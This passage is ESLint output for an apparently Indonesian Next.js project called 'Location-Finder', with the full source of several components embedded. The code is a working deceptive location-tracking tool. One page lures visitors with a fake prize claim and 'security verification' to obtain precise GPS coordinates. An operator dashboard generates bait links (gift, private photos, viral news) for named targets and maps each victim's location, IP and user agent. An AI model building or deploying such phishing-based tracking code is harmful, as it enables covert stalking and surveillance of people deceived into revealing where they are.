tFound' is defined but never used.","line":4,"column":10,"nodeType":"Identifier","messageId":"unusedVar","endLine":4,"endColumn":18,"suggestions":[{"messageId":"removeUnusedImportDeclaration","data":{"varName":"notFound"},"fix":{"range":[68,113],"text":""},"desc":"Remove unused import declaration."}]},{"ruleId":"react-hooks/set-state-in-effect","severity":2,"message":"Error: Calling setState synchronously within an effect can trigger cascading renders\n\nEffects are intended to synchronize state between React and external systems such as manually updating the DOM, state management libraries, or other platform APIs. In general, the body of an effect should do one or both of the following:\n* Update external systems with the latest state from React.\n* Subscribe for updates from some external system, calling setState in a callback function when external state changes.\n\nCalling setState synchronously within an effect body causes cascading renders that can hurt performance, and is not recommended. (https://react.dev/learn/you-might-not-need-an-effect).\n\nC:\\Users\\HYPE AMD\\Documents\\Karir\\Location-Finder\\src\\app\\t\\[id]\\page.tsx:17:9\n  15 |         // Since this is a simple static MVP client, we will just assume 'gift' unless passed in URL params.\n  16 |         // For now we will just use a generic presentation.\n> 17 |         setLoading(false);\n     |         ^^^^^^^^^^ Avoid calling setState() directly within an effect\n  18 |     }, [id]);\n  19 |\n  20 |     const captureLocation = () => {","line":17,"column":9,"nodeType":null,"endLine":17,"endColumn":19}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":0,"warningCount":1,"fixableErrorCount":0,"fixableWarningCount":0,"source":"'use client';\r\n\r\nimport { useEffect, useState, use } from 'react';\r\nimport { notFound } from 'next/navigation';\r\n\r\nexport default function TrackingPage({ params }: { params: Promise<{ id: string }> }) {\r\n    const unwrappedParams = use(params);\r\n    const { id } = unwrappedParams;\r\n\r\n    const [loading, setLoading] = useState(true);\r\n    const [status, setStatus] = useState<'idle' | 'requesting' | 'success' | 'error'>('idle');\r\n\r\n    useEffect(() => {\r\n        // In a real app we would fetch the link info from the DB to see what template to show.\r\n        // Since this is a simple static MVP client, we will just assume 'gift' unless passed in URL params.\r\n        // For now we will just use a generic presentation.\r\n        setLoading(false);\r\n    }, [id]);\r\n\r\n    const captureLocation = () => {\r\n        setStatus('requesting');\r\n\r\n        if ('geolocation' in navigator) {\r\n            navigator.geolocation.getCurrentPosition(\r\n                async (position) => {\r\n                    try {\r\n                        await fetch('/api/track/capture', {\r\n                            method: 'POST',\r\n                            headers: { 'Content-Type': 'application/json' },\r\n                            body: JSON.stringify({\r\n                                linkId: id,\r\n                                lat: position.coords.latitude,\r\n                                lng: position.coords.longitude,\r\n                                accuracy: position.coords.accuracy,\r\n                            }),\r\n                        });\r\n                        setStatus('success');\r\n                    } catch {\r\n                        console.error('Failed to send location');\r\n                        setStatus('error');\r\n                    }\r\n                },\r\n                (error) => {\r\n                    console.error('Geolocation error:', error);\r\n                    setStatus('error');\r\n                },\r\n                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }\r\n            );\r\n        } else {\r\n            setStatus('error');\r\n        }\r\n    };\r\n\r\n    if (loading) return null;\r\n\r\n    return (\r\n        <div style={{\r\n            minHeight: '100vh',\r\n            display: 'flex',\r\n            alignItems: 'center',\r\n            justifyContent: 'center',\r\n            backgroundColor: '#f8f9fa',\r\n            color: '#333',\r\n            fontFamily: 'Inter, sans-serif'\r\n        }}>\r\n            <div style={{\r\n                backgroundColor: 'white',\r\n                padding: '32px',\r\n                borderRadius: '16px',\r\n                maxWidth: '400px',\r\n                width: '90%',\r\n                boxShadow: '0 10px 25px rgba(0,0,0,0.1)',\r\n                textAlign: 'center'\r\n            }}>\r\n\r\n                {status === 'idle' && (\r\n                    <>\r\n                        <div style={{ fontSize: '48px', marginBottom: '16px' }}>🎁</div>\r\n                        <h1 style={{ fontSize: '24px', fontWeight: 'bold', marginBottom: '8px' }}>\r\n                            Anda Mendapatkan Hadiah Khusus!\r\n                        </h1>\r\n                        <p style={{ color: '#666', marginBottom: '24px', lineHeight: '1.5' }}>\r\n                            Untuk memverifikasi identitas Anda dan mengirimkan hadiah, silakan klik tombol di bawah ini dan ikuti instruksi keamanan.\r\n                        </p>\r\n                        <button\r\n                            onClick={captureLocation}\r\n                            style={{\r\n                                backgroundColor: '#2ea043',\r\n                                color: 'white',\r\n                                border: 'none',\r\n                                padding: '14px 24px',\r\n                                borderRadius: '8px',\r\n                                fontSize: '16px',\r\n                                fontWeight: '600',\r\n                                width: '100%',\r\n                                cursor: 'pointer',\r\n                                boxShadow: '0 4px 6px rgba(46, 160, 67, 0.2)'\r\n                            }}\r\n                        >\r\n                            Klaim Sekarang (Verifikasi Keamanan)\r\n                        </button>\r\n                        <p style={{ marginTop: '16px', fontSize: '12px', color: '#999' }}>\r\n                            Pastikan Anda mengizinkan akses yang diminta untuk melanjutkan.\r\n                        </p>\r\n                    </>\r\n                )}\r\n\r\n                {status === 'requesting' && (\r\n                    <>\r\n                        <div style={{ marginBottom: '16px' }}>\r\n                            <div style={{ display: 'inline-block', width: '40px', height: '40px', border: '4px solid #f3f3f3', borderTop: '4px solid #2ea043', borderRadius: '50%', animation: 'spin 1s linear infinite' }} />\r\n                            <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>\r\n                        </div>\r\n                        <h2 style={{ fontSize: '20px', fontWeight: 'bold' }}>Sedang Memverifikasi...</h2>\r\n                        <p style={{ color: '#666', marginTop: '8px' }}>Mohon izinkan pop-up / permintaan akses dari browser Anda.</p>\r\n                    </>\r\n                )}\r\n\r\n                {status === 'success' && (\r\n                    <>\r\n                        <div style={{ fontSize: '48px', marginBottom: '16px' }}>✅</div>\r\n                        <h2 style={{ fontSize: '20px', fontWeight: 'bold', marginBottom: '8px' }}>Verifikasi Berhasil!</h2>\r\n                        <p style={{ color: '#666' }}>Hadiah Anda sedang diproses. Terima kasih.</p>\r\n                    </>\r\n                )}\r\n\r\n                {status === 'error' && (\r\n                    <>\r\n                        <div style={{ fontSize: '48px', marginBottom: '16px' }}>❌</div>\r\n                        <h2 style={{ fontSize: '20px', fontWeight: 'bold', marginBottom: '8px' }}>Verifikasi Gagal</h2>\r\n                        <p style={{ color: '#666', marginBottom: '16px' }}>Anda harus mengizinkan akses lokasi untuk memverifikasi bahwa Anda bukan robot.</p>\r\n                        <button\r\n                            onClick={captureLocation}\r\n                            style={{\r\n                                backgroundColor: '#f85149',\r\n                                color: 'white',\r\n                                border: 'none',\r\n                                padding: '10px 20px',\r\n                                borderRadius: '8px',\r\n                                cursor: 'pointer'\r\n                            }}\r\n                        >\r\n                            Coba Lagi\r\n                        </button>\r\n                    </>\r\n                )}\r\n\r\n            </div>\r\n        </div>\r\n    );\r\n}\r\n","usedDeprecatedRules":[]},{"filePath":"C:\\Users\\HYPE AMD\\Documents\\Karir\\Location-Finder\\src\\components\\DynamicMap.tsx","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"C:\\Users\\HYPE AMD\\Documents\\Karir\\Location-Finder\\src\\components\\MapView.tsx","messages":[{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'useEffect' is defined but never used.","line":3,"column":10,"nodeType":"Identifier","messageId":"unusedVar","endLine":3,"endColumn":19,"suggestions":[{"messageId":"removeUnusedImportDeclaration","data":{"varName":"useEffect"},"fix":{"range":[17,53],"text":""},"desc":"Remove unused import declaration."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":1,"fixableErrorCount":0,"fixableWarningCount":0,"source":"'use client';\r\n\r\nimport { useEffect } from 'react';\r\nimport { MapContainer, TileLayer, Marker, Popup } from 'react-leaflet';\r\nimport L from 'leaflet';\r\nimport 'leaflet/dist/leaflet.css';\r\nimport { LocationCapture } from '@/lib/storage';\r\n\r\ninterface MapViewProps {\r\n    captures: LocationCapture[];\r\n}\r\n\r\n// Fix for default Leaflet icon not loading in Next.js\r\n// We use a custom DivIcon or a simpler setup\r\nconst createCustomIcon = () => {\r\n    return new L.DivIcon({\r\n        className: 'custom-leaflet-marker',\r\n        html: `<div style=\"\r\n      background-color: var(--error-color);\r\n      width: 20px;\r\n      height: 20px;\r\n      border-radius: 50%;\r\n      border: 3px solid white;\r\n      box-shadow: 0 0 10px rgba(0,0,0,0.5);\r\n    \"></div>`,\r\n        iconSize: [20, 20],\r\n        iconAnchor: [10, 10],\r\n        popupAnchor: [0, -10]\r\n    });\r\n};\r\n\r\nexport default function MapView({ captures }: MapViewProps) {\r\n    // Center of Indonesia by default\r\n    const defaultCenter: [number, number] = [-2.5489, 118.0149];\r\n    const defaultZoom = captures.length > 0 ? 12 : 5;\r\n\r\n    const center: [number, number] = captures.length > 0\r\n        ? [captures[0].lat, captures[0].lng]\r\n        : defaultCenter;\r\n\r\n    return (\r\n        <div style={{ height: '500px', width: '100%', borderRadius: '12px', overflow: 'hidden', border: '1px solid var(--card-border)' }}>\r\n            <MapContainer\r\n                center={center}\r\n                zoom={defaultZoom}\r\n                scrollWheelZoom={true}\r\n                style={{ height: '100%', width: '100%' }}\r\n            >\r\n                <TileLayer\r\n                    attribution='&copy; <a href=\"https://www.openstreetmap.org/copyright\">OpenStreetMap</a> contributors'\r\n                    url=\"https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png\"\r\n                />\r\n\r\n                {captures.map((capture, index) => (\r\n                    <Marker\r\n                        key={`${capture.linkId}-${index}`}\r\n                        position={[capture.lat, capture.lng]}\r\n                        icon={createCustomIcon()}\r\n                    >\r\n                        <Popup>\r\n                            <div style={{ color: '#333' }}>\r\n                                <strong style={{ fontSize: '14px', marginBottom: '4px', display: 'block' }}>Lokasi Terdeteksi</strong>\r\n\r\n                                <div style={{ fontSize: '12px', marginBottom: '8px' }}>\r\n                                    <p><strong>Waktu:</strong> {new Date(capture.timestamp).toLocaleString('id-ID')}</p>\r\n                                    <p><strong>Akurasi:</strong> ~{Math.round(capture.accuracy)} meter</p>\r\n                                    <p><strong>IP:</strong> {capture.ip}</p>\r\n                                    <p style={{ marginTop: '4px', wordBreak: 'break-all', fontSize: '10px', color: '#666' }}>\r\n                                        User Agent:<br />{capture.userAgent}\r\n                                    </p>\r\n                                </div>\r\n\r\n                                <a\r\n                                    href={`https://www.google.com/maps/search/?api=1&query=${capture.lat},${capture.lng}`}\r\n                                    target=\"_blank\"\r\n                                    rel=\"noopener noreferrer\"\r\n                                    style={{\r\n                                        display: 'block',\r\n                                        textAlign: 'center',\r\n                                        backgroundColor: '#1E90FF',\r\n                                        color: 'white',\r\n                                        padding: '6px 10px',\r\n                                        borderRadius: '4px',\r\n                                        textDecoration: 'none',\r\n                                        fontWeight: 'bold',\r\n                                        fontSize: '12px',\r\n                                        marginTop: '8px'\r\n                                    }}\r\n                                >\r\n                                    📍 Buka di Google Maps\r\n                                </a>\r\n                            </div>\r\n                        </Popup>\r\n                    </Marker>\r\n                ))}\r\n            </MapContainer>\r\n        </div>\r\n    );\r\n}\r\n","usedDeprecatedRules":[]},{"filePath":"C:\\Users\\HYPE AMD\\Documents\\Karir\\Location-Finder\\src\\components\\PhoneLookup.tsx","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"C:\\Users\\HYPE AMD\\Documents\\Karir\\Location-Finder\\src\\components\\TrackingManager.tsx","messages":[{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'err' is defined but never used.","line":64,"column":18,"nodeType":"Identifier","messageId":"unusedVar","endLine":64,"endColumn":21}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":1,"fixableErrorCount":0,"fixableWarningCount":0,"source":"'use client';\r\n\r\nimport { useState, useEffect } from 'react';\r\nimport { TrackingLink, LocationCapture } from '@/lib/storage';\r\nimport DynamicMap from './DynamicMap';\r\n\r\nexport default function TrackingManager() {\r\n    const [label, setLabel] = useState('');\r\n    const [template, setTemplate] = useState('gift');\r\n    const [loading, setLoading] = useState(false);\r\n    const [links, setLinks] = useState<TrackingLink[]>([]);\r\n    const [captures, setCaptures] = useState<LocationCapture[]>([]);\r\n    const [error, setError] = useState('');\r\n    const [success, setSuccess] = useState('');\r\n\r\n    const fetchResults = async () => {\r\n        try {\r\n            const res = await fetch('/api/track/results');\r\n            if (res.ok) {\r\n                const data = await res.json();\r\n                setLinks(data.links || []);\r\n                setCaptures(data.captures || []);\r\n            }\r\n        } catch {\r\n            console.error('Failed to fetch tracking data');\r\n        }\r\n    };\r\n\r\n    useEffect(() => {\r\n        fetchResults();\r\n        // Auto refresh every 10 seconds\r\n        const interval = setInterval(fetchResults, 10000);\r\n        return () => clearInterval(interval);\r\n    }, []);\r\n\r\n    const handleCreateLink = async (e: React.FormEvent) => {\r\n        e.preventDefault();\r\n        setLoading(true);\r\n        setError('');\r\n        setSuccess('');\r\n\r\n        if (!label) {\r\n            setError('Masukkan nama/label target.');\r\n            setLoading(false);\r\n            return;\r\n        }\r\n\r\n        try {\r\n            const res = await fetch('/api/track/create', {\r\n                method: 'POST',\r\n                headers: { 'Content-Type': 'application/json' },\r\n                body: JSON.stringify({ label, template }),\r\n            });\r\n\r\n            const data = await res.json();\r\n\r\n            if (res.ok) {\r\n                setSuccess('Link tracking berhasil dibuat!');\r\n                setLabel('');\r\n                fetchResults();\r\n            } else {\r\n                setError(data.error || 'Gagal membuat link.');\r\n            }\r\n        } catch (err) {\r\n            setError('Terjadi kesalahan jaringan.');\r\n        } finally {\r\n            setLoading(false);\r\n        }\r\n    };\r\n\r\n    const copyToClipboard = (id: string) => {\r\n        const url = `${window.location.origin}/t/${id}`;\r\n        navigator.clipboard.writeText(url);\r\n        alert('Link disalin ke clipboard!');\r\n    };\r\n\r\n    return (\r\n        <div className=\"animate-fade-in\">\r\n            <div className=\"glass-card\" style={{ marginBottom: '24px' }}>\r\n                <h2 className=\"heading\" style={{ fontSize: '1.5rem' }}>Create Tracking Link</h2>\r\n                <p className=\"subheading\">Buat link khusus yang akan meminta izin akses GPS saat dibuka target.</p>\r\n\r\n                <form onSubmit={handleCreateLink} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>\r\n                    <div>\r\n                        <label className=\"label\">Nama Target / Referensi</label>\r\n                        <input\r\n                            type=\"text\"\r\n                            className=\"input-field\"\r\n                            value={label}\r\n                            onChange={(e) => setLabel(e.target.value)}\r\n                            placeholder=\"Contoh: Penipu A\"\r\n                        />\r\n                    </div>\r\n\r\n                    <div>\r\n                        <label className=\"label\">Template Halaman Umpan</label>\r\n                        <select\r\n                            className=\"input-field\"\r\n                            value={template}\r\n                            onChange={(e) => setTemplate(e.target.value)}\r\n                            style={{ cursor: 'pointer' }}\r\n                        >\r\n                            <option value=\"gift\">Klaim Hadiah / Saldo</option>\r\n                            <option value=\"photo\">Galeri Foto Pribadi</option>\r\n                            <option value=\"article\">Artikel Berita Viral</option>\r\n                        </select>\r\n                    </div>\r\n\r\n                    <button type=\"submit\" className=\"btn-primary\" disabled={loading} style={{ marginTop: '8px' }}>\r\n                        {loading ? 'Membuat...' : 'Generate Link'}\r\n                    </button>\r\n\r\n                    {error && <p style={{ color: 'var(--error-color)', fontSize: '14px' }}>{error}</p>}\r\n                    {success && <p style={{ color: 'var(--success-color)', fontSize: '14px' }}>{success}</p>}\r\n                </form>\r\n            </div>\r\n\r\n            <div className=\"glass-card\">\r\n                <h3 style={{ marginBottom: '16px', fontSize: '1.2rem' }}>Daftar Link Aktif</h3>\r\n\r\n                {links.length === 0 ? (\r\n                    <p style={{ color: 'var(--text-secondary)' }}>Belum ada link yang dibuat.</p>\r\n                ) : (\r\n                    <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>\r\n                        {links.slice().reverse().map((link) => {\r\n                            const linkCaptures = captures.filter(c => c.linkId === link.id);\r\n\r\n                            return (\r\n                                <div key={link.id} style={{\r\n                                    padding: '16px',\r\n                                    borderRadius: '8px',\r\n                                    background: 'rgba(0,0,0,0.2)',\r\n                                    border: '1px solid var(--card-border)',\r\n                                    display: 'flex',\r\n                                    justifyContent: 'space-between',\r\n                                    alignItems: 'flex-start',\r\n                                    flexWrap: 'wrap',\r\n                                    gap: '16px'\r\n                                }}>\r\n                                    <div>\r\n                                        <h4 style={{ color: 'var(--accent-color)', marginBottom: '4px' }}>{link.label}</h4>\r\n                                        <p style={{ fontSize: '12px', color: 'var(--text-secondary)', marginBottom: '8px' }}>\r\n                                            Template: {link.template} • Dibuat: {new Date(link.createdAt).toLocaleString()}\r\n                                        </p>\r\n                                        <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>\r\n                                            <span className=\"badge\" style={{\r\n                                                background: linkCaptures.length > 0 ? 'rgba(46,160,67,0.2)' : 'rgba(210,153,34,0.2)',\r\n                                                color: linkCaptures.length > 0 ? 'var(--success-color)' : '#d29922',\r\n                                                border: `1px solid ${linkCaptures.length > 0 ? 'rgba(46,160,67,0.3)' : 'rgba(210,153,34,0.3)'}`\r\n                                            }}>\r\n                                                {linkCaptures.length > 0 ? `${linkCaptures.length} Lokasi Terdeteksi` : 'Belum Ada Lokasi'}\r\n                                            </span>\r\n                                        </div>\r\n                                    </div>\r\n\r\n                                    <div style={{ display: 'flex', gap: '8px' }}>\r\n                                        <button\r\n                                            onClick={() => copyToClipboard(link.id)}\r\n                                            className=\"btn-secondary\"\r\n                                            style={{ padding: '8px 16px', fontSize: '14px' }}\r\n                                        >\r\n                                            📋 Copy Link\r\n                                        </button>\r\n                                    </div>\r\n                                </div>\r\n                            );\r\n                        })}\r\n                    </div>\r\n                )}\r\n            </div>\r\n\r\n            {captures.length > 0 && (\r\n                <div className=\"glass-card\" style={{ marginTop: '24px' }}>\r\n                    <h3 style={{ marginBottom: '16px', fontSize: '1.2rem' }}>Peta Lokasi ({captures.length} Titik)</h3>\r\n                    <DynamicMap captures={captures} />\r\n                </div>\r\n            )}\r\n        </div>\r\n    );\r\n}\r\n","usedDeprecatedRules":[]},{"filePath":"C:\\Users\\HYPE AMD\\Documents\\Karir\\Location-Finder\\src\\lib\\storage.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]}]
